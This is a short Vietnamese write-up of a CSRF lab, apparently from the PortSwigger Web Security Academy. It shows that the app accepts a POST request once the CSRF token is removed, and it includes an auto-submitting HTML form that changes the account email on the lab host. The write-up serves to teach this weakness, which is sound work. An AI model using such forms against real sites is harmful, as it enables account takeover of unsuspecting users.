![image](https://github.com/user-attachments/assets/4c5bbe0e-c1b3-413b-a6f4-48a803a3beeb)

![image](https://github.com/user-attachments/assets/2f784547-b3fc-490c-b715-bb19a0cc93d0)

Nó lại tiếp tục có csrf token ở method POST

![image](https://github.com/user-attachments/assets/6d600adf-7e2f-4336-8dae-1e1a20ab1571)

Tiến hành đổi giá trị thì dường như nó không được.

![image](https://github.com/user-attachments/assets/13370e2e-bd7f-4044-978a-b65352551003)

Nhưng khi xóa luôn thì lại được??? Lí do tại sao vậy??

Có thể ứng dụng check không chặt chẽ. Tức là nếu request có kèm với csrf token thì nó sẽ check xem có đúng giá trị hay không. Nhưng nó lại không bắt buộc csrf token phải được gửi kèm cùng với request.

Ảo ma lazada.

Tiến hành gửi payload thôi:

```
<html>
  <body>
    <form action="https://0aa10033040b259e807ab20000890083.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="clap@gmail.com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
``

![image](https://github.com/user-attachments/assets/be566813-3ca1-4c1b-a2b7-b869a2da1120)

Và thành công.
